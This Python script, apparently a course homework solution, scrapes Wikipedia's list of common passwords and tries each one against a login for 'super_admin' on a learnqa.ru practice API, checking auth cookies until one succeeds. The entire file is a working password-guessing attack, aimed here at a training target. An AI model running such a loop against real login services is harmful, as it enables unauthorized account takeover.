import requests
# Так как таблица большая, нужен способ извлекать данные из нее
from bs4 import BeautifulSoup

url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
response = requests.get(url)
html_content = response.text

soup = BeautifulSoup(html_content, "html.parser")

# Находим таблицу по заголовку
caption_text = "Top 25 most common passwords by year according to SplashData"
table = soup.select_one(f"caption:-soup-contains('{caption_text}')").find_parent("table")

# Получаем все строчки таблицы
rows = table.find_all("tr")

# Создаем пустой массив для хранения паролей
passwords = []

# Проходим по каждой строчке таблицы, пропуская заголовок
for row in rows[1:]:
    # Получаем текст из каждой ячейки, кроме первого столбца (счетчика)
    cells = row.find_all("td")
    for cell in cells[1:]:
        password = cell.text.strip()
        passwords.append(password)

# print(passwords)

login = "super_admin"

secret_pass_method_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie_method_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords:
    data = {"login": login, "password": password}

    # Вызываем метод авторизации и получаем значение auth_cookie
    response_1 = requests.post(secret_pass_method_url, data=data)
    auth_cookie = response_1.cookies.get("auth_cookie")

    # Передаем auth_cookie
    cookie = {"auth_cookie": auth_cookie}
    response_2 = requests.get(check_auth_cookie_method_url, cookies=cookie)
    response_text = response_2.text

    # Проверяем ответ от второго метода
    if response_text == "You are NOT authorized":
        continue

    # Если ответ отличается от "You are NOT authorized", завершаем цикл и выводим результаты
    print(f"Текущий пароль: {password}")
    print(f"Ответ от метода проверки авторизации: {response_text}")
    break
